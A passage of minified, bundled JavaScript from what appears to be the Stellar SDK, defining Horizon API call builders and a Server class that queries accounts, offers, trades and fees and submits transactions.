        K.prototype._parseRecord = function(Q) {
            var ee = this;
            if (!Q._links)
                return Q;
            for (var ae = function(he) {
                var pe = Q._links[he]
                  , ye = !1;
                if (typeof Q[he] < "u" && (Q[he + "_attr"] = Q[he],
                ye = !0),
                ye && X.indexOf(he) >= 0) {
                    var be = ne._parseRecord(Q[he]);
                    Q[he] = function() {
                        return _.__awaiter(ee, void 0, void 0, function() {
                            return _.__generator(this, function(xe) {
                                return [2, be]
                            })
                        })
                    }
                } else
                    Q[he] = ne._requestFnForLink(pe)
            }, ne = this, oe = 0, ue = Object.keys(Q._links); oe < ue.length; oe++) {
                var fe = ue[oe];
                ae(fe)
            }
            return Q
        }
        ,
        K.prototype._sendNormalRequest = function(Q) {
            return _.__awaiter(this, void 0, void 0, function() {
                var ee;
                return _.__generator(this, function(ae) {
                    return ee = Q,
                    ee.authority() === "" && (ee = ee.authority(this.url.authority())),
                    ee.protocol() === "" && (ee = ee.protocol(this.url.protocol())),
                    [2, w.default.get(ee.toString()).then(function(ne) {
                        return ne.data
                    }).catch(this._handleNetworkError)]
                })
            })
        }
        ,
        K.prototype._parseResponse = function(Q) {
            return Q._embedded && Q._embedded.records ? this._toCollectionPage(Q) : this._parseRecord(Q)
        }
        ,
        K.prototype._toCollectionPage = function(Q) {
            for (var ee = this, ae = 0; ae < Q._embedded.records.length; ae += 1)
                Q._embedded.records[ae] = this._parseRecord(Q._embedded.records[ae]);
            return {
                records: Q._embedded.records,
                next: function() {
                    return _.__awaiter(ee, void 0, void 0, function() {
                        var ne;
                        return _.__generator(this, function(oe) {
                            switch (oe.label) {
                            case 0:
                                return [4, this._sendNormalRequest(j.default(Q._links.next.href))];
                            case 1:
                                return ne = oe.sent(),
                                [2, this._toCollectionPage(ne)]
                            }
                        })
                    })
                },
                prev: function() {
                    return _.__awaiter(ee, void 0, void 0, function() {
                        var ne;
                        return _.__generator(this, function(oe) {
                            switch (oe.label) {
                            case 0:
                                return [4, this._sendNormalRequest(j.default(Q._links.prev.href))];
                            case 1:
                                return ne = oe.sent(),
                                [2, this._toCollectionPage(ne)]
                            }
                        })
                    })
                }
            }
        }
        ,
        K.prototype._handleNetworkError = function(Q) {
            return _.__awaiter(this, void 0, void 0, function() {
                return _.__generator(this, function(ee) {
                    if (Q.response && Q.response.status && Q.response.statusText)
                        switch (Q.response.status) {
                        case 404:
                            return [2, Promise.reject(new x.NotFoundError(Q.response.statusText,Q.response.data))];
                        default:
                            return [2, Promise.reject(new x.NetworkError(Q.response.statusText,Q.response.data))]
                        }
                    else
                        return [2, Promise.reject(new Error(Q.message))]
                })
            })
        }
        ,
        K
    }();
    return call_builder.CallBuilder = V,
    call_builder
}
var account_call_builder = {}, hasRequiredAccount_call_builder;
function requireAccount_call_builder() {
    if (hasRequiredAccount_call_builder)
        return account_call_builder;
    hasRequiredAccount_call_builder = 1,
    Object.defineProperty(account_call_builder, "__esModule", {
        value: !0
    }),
    account_call_builder.AccountCallBuilder = void 0;
    var _ = require$$0$2
      , M = requireCall_builder()
      , j = function(O) {
        _.__extends(x, O);
        function x(w) {
            var b = O.call(this, w) || this;
            return b.url.segment("accounts"),
            b
        }
        return x.prototype.accountId = function(w) {
            var b = new M.CallBuilder(this.url.clone());
            return b.filter.push([w]),
            b
        }
        ,
        x.prototype.forSigner = function(w) {
            return this.url.setQuery("signer", w),
            this
        }
        ,
        x.prototype.forAsset = function(w) {
            return this.url.setQuery("asset", "" + w),
            this
        }
        ,
        x.prototype.sponsor = function(w) {
            return this.url.setQuery("sponsor", w),
            this
        }
        ,
        x
    }(M.CallBuilder);
    return account_call_builder.AccountCallBuilder = j,
    account_call_builder
}
var assets_call_builder = {}, hasRequiredAssets_call_builder;
function requireAssets_call_builder() {
    if (hasRequiredAssets_call_builder)
        return assets_call_builder;
    hasRequiredAssets_call_builder = 1,
    Object.defineProperty(assets_call_builder, "__esModule", {
        value: !0
    }),
    assets_call_builder.AssetsCallBuilder = void 0;
    var _ = require$$0$2
      , M = requireCall_builder()
      , j = function(O) {
        _.__extends(x, O);
        function x(w) {
            var b = O.call(this, w) || this;
            return b.url.segment("assets"),
            b
        }
        return x.prototype.forCode = function(w) {
            return this.url.setQuery("asset_code", w),
            this
        }
        ,
        x.prototype.forIssuer = function(w) {
            return this.url.setQuery("asset_issuer", w),
            this
        }
        ,
        x
    }(M.CallBuilder);
    return assets_call_builder.AssetsCallBuilder = j,
    assets_call_builder
}
var claimable_balances_call_builder = {}, hasRequiredClaimable_balances_call_builder;
function requireClaimable_balances_call_builder() {
    if (hasRequiredClaimable_balances_call_builder)
        return claimable_balances_call_builder;
    hasRequiredClaimable_balances_call_builder = 1,
    Object.defineProperty(claimable_balances_call_builder, "__esModule", {
        value: !0
    }),
    claimable_balances_call_builder.ClaimableBalanceCallBuilder = void 0;
    var _ = require$$0$2
      , M = requireCall_builder()
      , j = function(O) {
        _.__extends(x, O);
        function x(w) {
            var b = O.call(this, w) || this;
            return b.url.segment("claimable_balances"),
            b
        }
        return x.prototype.claimableBalance = function(w) {
            var b = new M.CallBuilder(this.url.clone());
            return b.filter.push([w]),
            b
        }
        ,
        x.prototype.sponsor = function(w) {
            return this.url.setQuery("sponsor", w),
            this
        }
        ,
        x.prototype.claimant = function(w) {
            return this.url.setQuery("claimant", w),
            this
        }
        ,
        x.prototype.asset = function(w) {
            return this.url.setQuery("asset", w.toString()),
            this
        }
        ,
        x
    }(M.CallBuilder);
    return claimable_balances_call_builder.ClaimableBalanceCallBuilder = j,
    claimable_balances_call_builder
}
var effect_call_builder = {}, hasRequiredEffect_call_builder;
function requireEffect_call_builder() {
    if (hasRequiredEffect_call_builder)
        return effect_call_builder;
    hasRequiredEffect_call_builder = 1,
    Object.defineProperty(effect_call_builder, "__esModule", {
        value: !0
    }),
    effect_call_builder.EffectCallBuilder = void 0;
    var _ = require$$0$2
      , M = requireCall_builder()
      , j = function(O) {
        _.__extends(x, O);
        function x(w) {
            var b = O.call(this, w) || this;
            return b.url.segment("effects"),
            b
        }
        return x.prototype.forAccount = function(w) {
            return this.filter.push(["accounts", w, "effects"]),
            this
        }
        ,
        x.prototype.forLedger = function(w) {
            return this.filter.push(["ledgers", typeof w == "number" ? w.toString() : w, "effects"]),
            this
        }
        ,
        x.prototype.forTransaction = function(w) {
            return this.filter.push(["transactions", w, "effects"]),
            this
        }
        ,
        x.prototype.forOperation = function(w) {
            return this.filter.push(["operations", w, "effects"]),
            this
        }
        ,
        x
    }(M.CallBuilder);
    return effect_call_builder.EffectCallBuilder = j,
    effect_call_builder
}
var friendbot_builder = {}, hasRequiredFriendbot_builder;
function requireFriendbot_builder() {
    if (hasRequiredFriendbot_builder)
        return friendbot_builder;
    hasRequiredFriendbot_builder = 1,
    Object.defineProperty(friendbot_builder, "__esModule", {
        value: !0
    }),
    friendbot_builder.FriendbotBuilder = void 0;
    var _ = require$$0$2
      , M = requireCall_builder()
      , j = function(O) {
        _.__extends(x, O);
        function x(w, b) {
            var X = O.call(this, w) || this;
            return X.url.segment("friendbot"),
            X.url.setQuery("addr", b),
            X
        }
        return x
    }(M.CallBuilder);
    return friendbot_builder.FriendbotBuilder = j,
    friendbot_builder
}
var ledger_call_builder = {}, hasRequiredLedger_call_builder;
function requireLedger_call_builder() {
    if (hasRequiredLedger_call_builder)
        return ledger_call_builder;
    hasRequiredLedger_call_builder = 1,
    Object.defineProperty(ledger_call_builder, "__esModule", {
        value: !0
    }),
    ledger_call_builder.LedgerCallBuilder = void 0;
    var _ = require$$0$2
      , M = requireCall_builder()
      , j = function(O) {
        _.__extends(x, O);
        function x(w) {
            var b = O.call(this, w) || this;
            return b.url.segment("ledgers"),
            b
        }
        return x.prototype.ledger = function(w) {
            return this.filter.push(["ledgers", w.toString()]),
            this
        }
        ,
        x
    }(M.CallBuilder);
    return ledger_call_builder.LedgerCallBuilder = j,
    ledger_call_builder
}
var offer_call_builder = {}, hasRequiredOffer_call_builder;
function requireOffer_call_builder() {
    if (hasRequiredOffer_call_builder)
        return offer_call_builder;
    hasRequiredOffer_call_builder = 1,
    Object.defineProperty(offer_call_builder, "__esModule", {
        value: !0
    }),
    offer_call_builder.OfferCallBuilder = void 0;
    var _ = require$$0$2
      , M = requireCall_builder()
      , j = function(O) {
        _.__extends(x, O);
        function x(w) {
            var b = O.call(this, w) || this;
            return b.url.segment("offers"),
            b
        }
        return x.prototype.offer = function(w) {
            var b = new M.CallBuilder(this.url.clone());
            return b.filter.push([w]),
            b
        }
        ,
        x.prototype.forAccount = function(w) {
            return this.filter.push(["accounts", w, "offers"]),
            this
        }
        ,
        x.prototype.buying = function(w) {
            return w.isNative() ? this.url.setQuery("buying_asset_type", "native") : (this.url.setQuery("buying_asset_type", w.getAssetType()),
            this.url.setQuery("buying_asset_code", w.getCode()),
            this.url.setQuery("buying_asset_issuer", w.getIssuer())),
            this
        }
        ,
        x.prototype.selling = function(w) {
            return w.isNative() ? this.url.setQuery("selling_asset_type", "native") : (this.url.setQuery("selling_asset_type", w.getAssetType()),
            this.url.setQuery("selling_asset_code", w.getCode()),
            this.url.setQuery("selling_asset_issuer", w.getIssuer())),
            this
        }
        ,
        x.prototype.sponsor = function(w) {
            return this.url.setQuery("sponsor", w),
            this
        }
        ,
        x
    }(M.CallBuilder);
    return offer_call_builder.OfferCallBuilder = j,
    offer_call_builder
}
var operation_call_builder = {}, hasRequiredOperation_call_builder;
function requireOperation_call_builder() {
    if (hasRequiredOperation_call_builder)
        return operation_call_builder;
    hasRequiredOperation_call_builder = 1,
    Object.defineProperty(operation_call_builder, "__esModule", {
        value: !0
    }),
    operation_call_builder.OperationCallBuilder = void 0;
    var _ = require$$0$2
      , M = requireCall_builder()
      , j = function(O) {
        _.__extends(x, O);
        function x(w) {
            var b = O.call(this, w) || this;
            return b.url.segment("operations"),
            b
        }
        return x.prototype.operation = function(w) {
            var b = new M.CallBuilder(this.url.clone());
            return b.filter.push([w]),
            b
        }
        ,
        x.prototype.forAccount = function(w) {
            return this.filter.push(["accounts", w, "operations"]),
            this
        }
        ,
        x.prototype.forClaimableBalance = function(w) {
            return this.filter.push(["claimable_balances", w, "operations"]),
            this
        }
        ,
        x.prototype.forLedger = function(w) {
            return this.filter.push(["ledgers", typeof w == "number" ? w.toString() : w, "operations"]),
            this
        }
        ,
        x.prototype.forTransaction = function(w) {
            return this.filter.push(["transactions", w, "operations"]),
            this
        }
        ,
        x.prototype.includeFailed = function(w) {
            return this.url.setQuery("include_failed", w.toString()),
            this
        }
        ,
        x
    }(M.CallBuilder);
    return operation_call_builder.OperationCallBuilder = j,
    operation_call_builder
}
var orderbook_call_builder = {}, hasRequiredOrderbook_call_builder;
function requireOrderbook_call_builder() {
    if (hasRequiredOrderbook_call_builder)
        return orderbook_call_builder;
    hasRequiredOrderbook_call_builder = 1,
    Object.defineProperty(orderbook_call_builder, "__esModule", {
        value: !0
    }),
    orderbook_call_builder.OrderbookCallBuilder = void 0;
    var _ = require$$0$2
      , M = requireCall_builder()
      , j = function(O) {
        _.__extends(x, O);
        function x(w, b, X) {
            var Y = O.call(this, w) || this;
            return Y.url.segment("order_book"),
            b.isNative() ? Y.url.setQuery("selling_asset_type", "native") : (Y.url.setQuery("selling_asset_type", b.getAssetType()),
            Y.url.setQuery("selling_asset_code", b.getCode()),
            Y.url.setQuery("selling_asset_issuer", b.getIssuer())),
            X.isNative() ? Y.url.setQuery("buying_asset_type", "native") : (Y.url.setQuery("buying_asset_type", X.getAssetType()),
            Y.url.setQuery("buying_asset_code", X.getCode()),
            Y.url.setQuery("buying_asset_issuer", X.getIssuer())),
            Y
        }
        return x
    }(M.CallBuilder);
    return orderbook_call_builder.OrderbookCallBuilder = j,
    orderbook_call_builder
}
var payment_call_builder = {}, hasRequiredPayment_call_builder;
function requirePayment_call_builder() {
    if (hasRequiredPayment_call_builder)
        return payment_call_builder;
    hasRequiredPayment_call_builder = 1,
    Object.defineProperty(payment_call_builder, "__esModule", {
        value: !0
    }),
    payment_call_builder.PaymentCallBuilder = void 0;
    var _ = require$$0$2
      , M = requireCall_builder()
      , j = function(O) {
        _.__extends(x, O);
        function x(w) {
            var b = O.call(this, w) || this;
            return b.url.segment("payments"),
            b
        }
        return x.prototype.forAccount = function(w) {
            return this.filter.push(["accounts", w, "payments"]),
            this
        }
        ,
        x.prototype.forLedger = function(w) {
            return this.filter.push(["ledgers", typeof w == "number" ? w.toString() : w, "payments"]),
            this
        }
        ,
        x.prototype.forTransaction = function(w) {
            return this.filter.push(["transactions", w, "payments"]),
            this
        }
        ,
        x
    }(M.CallBuilder);
    return payment_call_builder.PaymentCallBuilder = j,
    payment_call_builder
}
var strict_receive_path_call_builder = {}, hasRequiredStrict_receive_path_call_builder;
function requireStrict_receive_path_call_builder() {
    if (hasRequiredStrict_receive_path_call_builder)
        return strict_receive_path_call_builder;
    hasRequiredStrict_receive_path_call_builder = 1,
    Object.defineProperty(strict_receive_path_call_builder, "__esModule", {
        value: !0
    }),
    strict_receive_path_call_builder.StrictReceivePathCallBuilder = void 0;
    var _ = require$$0$2
      , M = requireCall_builder()
      , j = function(O) {
        _.__extends(x, O);
        function x(w, b, X, Y) {
            var F = O.call(this, w) || this;
            if (F.url.segment("paths/strict-receive"),
            typeof b == "string")
                F.url.setQuery("source_account", b);
            else {
                var V = b.map(function(K) {
                    return K.isNative() ? "native" : K.getCode() + ":" + K.getIssuer()
                }).join(",");
                F.url.setQuery("source_assets", V)
            }
            return F.url.setQuery("destination_amount", Y),
            X.isNative() ? F.url.setQuery("destination_asset_type", "native") : (F.url.setQuery("destination_asset_type", X.getAssetType()),
            F.url.setQuery("destination_asset_code", X.getCode()),
            F.url.setQuery("destination_asset_issuer", X.getIssuer())),
            F
        }
        return x
    }(M.CallBuilder);
    return strict_receive_path_call_builder.StrictReceivePathCallBuilder = j,
    strict_receive_path_call_builder
}
var strict_send_path_call_builder = {}, hasRequiredStrict_send_path_call_builder;
function requireStrict_send_path_call_builder() {
    if (hasRequiredStrict_send_path_call_builder)
        return strict_send_path_call_builder;
    hasRequiredStrict_send_path_call_builder = 1,
    Object.defineProperty(strict_send_path_call_builder, "__esModule", {
        value: !0
    }),
    strict_send_path_call_builder.StrictSendPathCallBuilder = void 0;
    var _ = require$$0$2
      , M = requireCall_builder()
      , j = function(O) {
        _.__extends(x, O);
        function x(w, b, X, Y) {
            var F = O.call(this, w) || this;
            if (F.url.segment("paths/strict-send"),
            b.isNative() ? F.url.setQuery("source_asset_type", "native") : (F.url.setQuery("source_asset_type", b.getAssetType()),
            F.url.setQuery("source_asset_code", b.getCode()),
            F.url.setQuery("source_asset_issuer", b.getIssuer())),
            F.url.setQuery("source_amount", X),
            typeof Y == "string")
                F.url.setQuery("destination_account", Y);
            else {
                var V = Y.map(function(K) {
                    return K.isNative() ? "native" : K.getCode() + ":" + K.getIssuer()
                }).join(",");
                F.url.setQuery("destination_assets", V)
            }
            return F
        }
        return x
    }(M.CallBuilder);
    return strict_send_path_call_builder.StrictSendPathCallBuilder = j,
    strict_send_path_call_builder
}
var trade_aggregation_call_builder = {}, hasRequiredTrade_aggregation_call_builder;
function requireTrade_aggregation_call_builder() {
    if (hasRequiredTrade_aggregation_call_builder)
        return trade_aggregation_call_builder;
    hasRequiredTrade_aggregation_call_builder = 1,
    Object.defineProperty(trade_aggregation_call_builder, "__esModule", {
        value: !0
    }),
    trade_aggregation_call_builder.TradeAggregationCallBuilder = void 0;
    var _ = require$$0$2
      , M = requireCall_builder()
      , j = requireErrors$1()
      , O = [6e4, 3e5, 9e5, 36e5, 864e5, 6048e5]
      , x = function(w) {
        _.__extends(b, w);
        function b(X, Y, F, V, K, Q, ee) {
            var ae = w.call(this, X) || this;
            if (ae.url.segment("trade_aggregations"),
            Y.isNative() ? ae.url.setQuery("base_asset_type", "native") : (ae.url.setQuery("base_asset_type", Y.getAssetType()),
            ae.url.setQuery("base_asset_code", Y.getCode()),
            ae.url.setQuery("base_asset_issuer", Y.getIssuer())),
            F.isNative() ? ae.url.setQuery("counter_asset_type", "native") : (ae.url.setQuery("counter_asset_type", F.getAssetType()),
            ae.url.setQuery("counter_asset_code", F.getCode()),
            ae.url.setQuery("counter_asset_issuer", F.getIssuer())),
            typeof V != "number" || typeof K != "number")
                throw new j.BadRequestError("Invalid time bounds",[V, K]);
            if (ae.url.setQuery("start_time", V.toString()),
            ae.url.setQuery("end_time", K.toString()),
            ae.isValidResolution(Q))
                ae.url.setQuery("resolution", Q.toString());
            else
                throw new j.BadRequestError("Invalid resolution",Q);
            if (ae.isValidOffset(ee, Q))
                ae.url.setQuery("offset", ee.toString());
            else
                throw new j.BadRequestError("Invalid offset",ee);
            return ae
        }
        return b.prototype.isValidResolution = function(X) {
            for (var Y = 0, F = O; Y < F.length; Y++) {
                var V = F[Y];
                if (V === X)
                    return !0
            }
            return !1
        }
        ,
        b.prototype.isValidOffset = function(X, Y) {
            var F = 36e5;
            return !(X > Y || X >= 24 * F || X % F !== 0)
        }
        ,
        b
    }(M.CallBuilder);
    return trade_aggregation_call_builder.TradeAggregationCallBuilder = x,
    trade_aggregation_call_builder
}
var trades_call_builder = {}, hasRequiredTrades_call_builder;
function requireTrades_call_builder() {
    if (hasRequiredTrades_call_builder)
        return trades_call_builder;
    hasRequiredTrades_call_builder = 1,
    Object.defineProperty(trades_call_builder, "__esModule", {
        value: !0
    }),
    trades_call_builder.TradesCallBuilder = void 0;
    var _ = require$$0$2
      , M = requireCall_builder()
      , j = function(O) {
        _.__extends(x, O);
        function x(w) {
            var b = O.call(this, w) || this;
            return b.url.segment("trades"),
            b
        }
        return x.prototype.forAssetPair = function(w, b) {
            return w.isNative() ? this.url.setQuery("base_asset_type", "native") : (this.url.setQuery("base_asset_type", w.getAssetType()),
            this.url.setQuery("base_asset_code", w.getCode()),
            this.url.setQuery("base_asset_issuer", w.getIssuer())),
            b.isNative() ? this.url.setQuery("counter_asset_type", "native") : (this.url.setQuery("counter_asset_type", b.getAssetType()),
            this.url.setQuery("counter_asset_code", b.getCode()),
            this.url.setQuery("counter_asset_issuer", b.getIssuer())),
            this
        }
        ,
        x.prototype.forOffer = function(w) {
            return this.url.setQuery("offer_id", w),
            this
        }
        ,
        x.prototype.forAccount = function(w) {
            return this.filter.push(["accounts", w, "trades"]),
            this
        }
        ,
        x
    }(M.CallBuilder);
    return trades_call_builder.TradesCallBuilder = j,
    trades_call_builder
}
var transaction_call_builder = {}, hasRequiredTransaction_call_builder;
function requireTransaction_call_builder() {
    if (hasRequiredTransaction_call_builder)
        return transaction_call_builder;
    hasRequiredTransaction_call_builder = 1,
    Object.defineProperty(transaction_call_builder, "__esModule", {
        value: !0
    }),
    transaction_call_builder.TransactionCallBuilder = void 0;
    var _ = require$$0$2
      , M = requireCall_builder()
      , j = function(O) {
        _.__extends(x, O);
        function x(w) {
            var b = O.call(this, w) || this;
            return b.url.segment("transactions"),
            b
        }
        return x.prototype.transaction = function(w) {
            var b = new M.CallBuilder(this.url.clone());
            return b.filter.push([w]),
            b
        }
        ,
        x.prototype.forAccount = function(w) {
            return this.filter.push(["accounts", w, "transactions"]),
            this
        }
        ,
        x.prototype.forClaimableBalance = function(w) {
            return this.filter.push(["claimable_balances", w, "transactions"]),
            this
        }
        ,
        x.prototype.forLedger = function(w) {
            var b = typeof w == "number" ? w.toString() : w;
            return this.filter.push(["ledgers", b, "transactions"]),
            this
        }
        ,
        x.prototype.includeFailed = function(w) {
            return this.url.setQuery("include_failed", w.toString()),
            this
        }
        ,
        x
    }(M.CallBuilder);
    return transaction_call_builder.TransactionCallBuilder = j,
    transaction_call_builder
}
var hasRequiredServer;
function requireServer() {
    return hasRequiredServer || (hasRequiredServer = 1,
    function(_) {
        Object.defineProperty(_, "__esModule", {
            value: !0
        }),
        _.Server = _.SUBMIT_TRANSACTION_TIMEOUT = void 0;
        var M = require$$0$2
          , j = M.__importDefault(requireBignumber$2())
          , O = M.__importDefault(requireIsEmpty())
          , x = M.__importDefault(requireMerge())
          , w = requireLib$3()
          , b = M.__importDefault(requireURI())
          , X = requireCall_builder()
          , Y = requireConfig()
          , F = requireErrors$1()
          , V = requireAccount_call_builder()
          , K = requireAccount_response()
          , Q = requireAssets_call_builder()
          , ee = requireClaimable_balances_call_builder()
          , ae = requireEffect_call_builder()
          , ne = requireFriendbot_builder()
          , oe = requireLedger_call_builder()
          , ue = requireOffer_call_builder()
          , fe = requireOperation_call_builder()
          , he = requireOrderbook_call_builder()
          , pe = requirePayment_call_builder()
          , ye = requireStrict_receive_path_call_builder()
          , be = requireStrict_send_path_call_builder()
          , xe = requireTrade_aggregation_call_builder()
          , Ae = requireTrades_call_builder()
          , Ee = requireTransaction_call_builder()
          , Be = M.__importStar(requireHorizon_axios_client());
        _.SUBMIT_TRANSACTION_TIMEOUT = 60 * 1e3;
        var ce = 1e7
          , q = "MQ==";
        function L(Z) {
            return new j.default(Z).div(ce).toString()
        }
        var U = function() {
            function Z(te, se) {
                se === void 0 && (se = {}),
                this.serverURL = b.default(te);
                var de = typeof se.allowHttp > "u" ? Y.Config.isAllowHttp() : se.allowHttp
                  , re = {};
                if (se.appName && (re["X-App-Name"] = se.appName),
                se.appVersion && (re["X-App-Version"] = se.appVersion),
                O.default(re) || Be.default.interceptors.request.use(function($) {
                    return $.headers = x.default(re, $.headers),
                    $
                }),
                this.serverURL.protocol() !== "https" && !de)
                    throw new Error("Cannot connect to insecure horizon server")
            }
            return Z.prototype.fetchTimebounds = function(te, se) {
                return se === void 0 && (se = !1),
                M.__awaiter(this, void 0, void 0, function() {
                    var de;
                    return M.__generator(this, function(re) {
                        switch (re.label) {
                        case 0:
                            return de = Be.getCurrentServerTime(this.serverURL.hostname()),
                            de ? [2, {
                                minTime: 0,
                                maxTime: de + te
                            }] : se ? [2, {
                                minTime: 0,
                                maxTime: Math.floor(new Date().getTime() / 1e3) + te
                            }] : [4, Be.default.get(b.default(this.serverURL).toString())];
                        case 1:
                            return re.sent(),
                            [4, this.fetchTimebounds(te, !0)];
                        case 2:
                            return [2, re.sent()]
                        }
                    })
                })
            }
            ,
            Z.prototype.fetchBaseFee = function() {
                return M.__awaiter(this, void 0, void 0, function() {
                    var te;
                    return M.__generator(this, function(se) {
                        switch (se.label) {
                        case 0:
                            return [4, this.feeStats()];
                        case 1:
                            return te = se.sent(),
                            [2, parseInt(te.last_ledger_base_fee, 10) || 100]
                        }
                    })
                })
            }
            ,
            Z.prototype.feeStats = function() {
                return M.__awaiter(this, void 0, void 0, function() {
                    var te;
                    return M.__generator(this, function(se) {
                        return te = new X.CallBuilder(b.default(this.serverURL)),
                        te.filter.push(["fee_stats"]),
                        [2, te.call()]
                    })
                })
            }
            ,
            Z.prototype.submitTransaction = function(te, se) {
                return se === void 0 && (se = {
                    skipMemoRequiredCheck: !1
                }),
                M.__awaiter(this, void 0, void 0, function() {
                    var de;
                    return M.__generator(this, function(re) {
                        switch (re.label) {
                        case 0:
                            return se.skipMemoRequiredCheck ? [3, 2] : [4, this.checkMemoRequired(te)];
                        case 1:
                            re.sent(),
                            re.label = 2;
                        case 2:
                            return de = encodeURIComponent(te.toEnvelope().toXDR().toString("base64")),
                            [2, Be.default.post(b.default(this.serverURL).segment("transactions").toString(), "tx=" + de, {
                                timeout: _.SUBMIT_TRANSACTION_TIMEOUT
                            }).then(function($) {
                                if (!$.data.result_xdr)
                                    return $.data;
                                var ie = w.xdr.TransactionResult.fromXDR($.data.result_xdr, "base64"), ve = ie.result().value(), ge, Re;
                                return ve.length && (ge = ve.map(function(Pe, Ie) {
                                    if (Pe.value().switch().name !== "manageBuyOffer" && Pe.value().switch().name !== "manageSellOffer")
                                        return null;
                                    Re = !0;
                                    var Te = new j.default(0), Le = new j.default(0), Ze = Pe.value().value().success(), $e = Ze.offersClaimed().map(function(je) {
                                        var Ke = je.value()
                                          , Qe = "";
                                        switch (je.switch()) {
                                        case w.xdr.ClaimAtomType.claimAtomTypeV0():
                                            Qe = w.StrKey.encodeEd25519PublicKey(Ke.sellerEd25519());
                                            break;
                                        case w.xdr.ClaimAtomType.claimAtomTypeOrderBook():
                                            Qe = w.StrKey.encodeEd25519PublicKey(Ke.sellerId().ed25519());
                                            break;
                                        default:
                                            throw new Error("Invalid offer result type: " + je.switch())
                                        }
                                        var We = new j.default(Ke.amountBought().toString())
                                          , mt = new j.default(Ke.amountSold().toString());
                                        Te = Te.add(mt),
                                        Le = Le.add(We);
                                        var ct = w.Asset.fromOperation(Ke.assetSold())
                                          , vt = w.Asset.fromOperation(Ke.assetBought())
                                          , we = {
                                            type: ct.getAssetType(),
                                            assetCode: ct.getCode(),
                                            issuer: ct.getIssuer()
                                        }
                                          , _e = {
                                            type: vt.getAssetType(),
                                            assetCode: vt.getCode(),
                                            issuer: vt.getIssuer()
                                        };
                                        return {
                                            sellerId: Qe,
                                            offerId: Ke.offerId().toString(),
                                            assetSold: we,
                                            amountSold: L(mt),
                                            assetBought: _e,
                                            amountBought: L(We)
                                        }
                                    }), Ne = Ze.offer().switch().name, qe;
                                    if (typeof Ze.offer().value == "function" && Ze.offer().value()) {
                                        var Ve = Ze.offer().value();
                                        qe = {
                                            offerId: Ve.offerId().toString(),
                                            selling: {},
                                            buying: {},
                                            amount: L(Ve.amount().toString()),
                                            price: {
                                                n: Ve.price().n(),
                                                d: Ve.price().d()
                                            }
                                        };
                                        var lt = w.Asset.fromOperation(Ve.selling());
                                        qe.selling = {
                                            type: lt.getAssetType(),
                                            assetCode: lt.getCode(),
                                            issuer: lt.getIssuer()
                                        };
                                        var nt = w.Asset.fromOperation(Ve.buying());
                                        qe.buying = {
                                            type: nt.getAssetType(),
                                            assetCode: nt.getCode(),
                                            issuer: nt.getIssuer()
                                        }
                                    }
                                    return {
                                        offersClaimed: $e,
                                        effect: Ne,
                                        operationIndex: Ie,
                                        currentOffer: qe,
                                        amountBought: L(Te),
                                        amountSold: L(Le),
                                        isFullyOpen: !$e.length && Ne !== "manageOfferDeleted",
                                        wasPartiallyFilled: !!$e.length && Ne !== "manageOfferDeleted",
                                        wasImmediatelyFilled: !!$e.length && Ne === "manageOfferDeleted",
                                        wasImmediatelyDeleted: !$e.length && Ne === "manageOfferDeleted"
                                    }
                                }).filter(function(Pe) {
                                    return !!Pe
                                })),
                                Object.assign({}, $.data, {
                                    offerResults: Re ? ge : void 0
                                })
                            }).catch(function($) {
                                return $ instanceof Error ? Promise.reject($) : Promise.reject(new F.BadResponseError("Transaction submission failed. Server responded: " + $.status + " " + $.statusText,$.data))
                            })]
                        }
                    })
                })
            }
            ,
            Z.prototype.accounts = function() {
                return new V.AccountCallBuilder(b.default(this.serverURL))
            }
            ,
            Z.prototype.claimableBalances = function() {
                return new ee.ClaimableBalanceCallBuilder(b.default(this.serverURL))
            }
            ,
            Z.prototype.ledgers = function() {
                return new oe.LedgerCallBuilder(b.default(this.serverURL))
            }
            ,
            Z.prototype.transactions = function() {
                return new Ee.TransactionCallBuilder(b.default(this.serverURL))
            }
            ,
            Z.prototype.offers = function() {
                return new ue.OfferCallBuilder(b.default(this.serverURL))
            }
            ,
            Z.prototype.orderbook = function(te, se) {
                return new he.OrderbookCallBuilder(b.default(this.serverURL),te,se)
            }
            ,
            Z.prototype.trades = function() {
                return new Ae.TradesCallBuilder(b.default(this.serverURL))
            }
            ,
            Z.prototype.operations = function() {
                return new fe.OperationCallBuilder(b.default(this.serverURL))
            }
            ,
            Z.prototype.strictReceivePaths = function(te, se, de) {
                return new ye.StrictReceivePathCallBuilder(b.default(this.serverURL),te,se,de)
            }
            ,
            Z.prototype.strictSendPaths = function(te, se, de) {
                return new be.StrictSendPathCallBuilder(b.default(this.serverURL),te,se,de)
            }
            ,
            Z.prototype.payments = function() {
                return new pe.PaymentCallBuilder(b.default(this.serverURL))
            }
            ,
            Z.prototype.effects = function() {
                return new ae.EffectCallBuilder(b.default(this.serverURL))
            }
            ,
            Z.prototype.friendbot = function(te) {
                return new ne.FriendbotBuilder(b.default(this.serverURL),te)
            }
            ,
            Z.prototype.assets = function() {
                return new Q.AssetsCallBuilder(b.default(this.serverURL))
            }
            ,
            Z.prototype.loadAccount = function(te) {
                return M.__awaiter(this, void 0, void 0, function() {
                    var se;
                    return M.__generator(this, function(de) {
                        switch (de.label) {
                        case 0:
                            return [4, this.accounts().accountId(te).call()];
                        case 1:
                            return se = de.sent(),
                            [2, new K.AccountResponse(se)]
                        }
                    })
                })
            }
            ,
            Z.prototype.tradeAggregation = function(te, se, de, re, $, ie) {
                return new xe.TradeAggregationCallBuilder(b.default(this.serverURL),te,se,de,re,$,ie)
            }
            ,
            Z.prototype.checkMemoRequired = function(te) {
                return M.__awaiter(this, void 0, void 0, function() {
                    var se, de, re, $, ie, ve;
                    return M.__generator(this, function(ge) {
                        switch (ge.label) {
                        case 0:
                            if (te instanceof w.FeeBumpTransaction && (te = te.innerTransaction),
                            te.memo.type !== "none")
                                return [2];
                            se = new Set,
                            de = 0,
                            ge.label = 1;
                        case 1:
                            if (!(de < te.operations.length))
                                return [3, 6];
                            switch (re = te.operations[de],
                            re.type) {
                            case "payment":
                            case "pathPaymentStrictReceive":
                            case "pathPaymentStrictSend":
                            case "accountMerge":
                                break;
                            default:
                                return [3, 5]
                            }
                            if ($ = re.destination,
                            se.has($))
                                return [3, 5];
                            if (se.add($),
                            $.startsWith("M"))
                                return [3, 5];
                            ge.label = 2;
                        case 2:
                            return ge.trys.push([2, 4, , 5]),
                            [4, this.loadAccount($)];
                        case 3:
                            if (ie = ge.sent(),
                            ie.data_attr["config.memo_required"] === q)
                                throw new F.AccountRequiresMemoError("account requires memo",$,de);
                            return [3, 5];
                        case 4:
                            if (ve = ge.sent(),
                            ve instanceof F.AccountRequiresMemoError || !(ve instanceof F.NotFoundError))
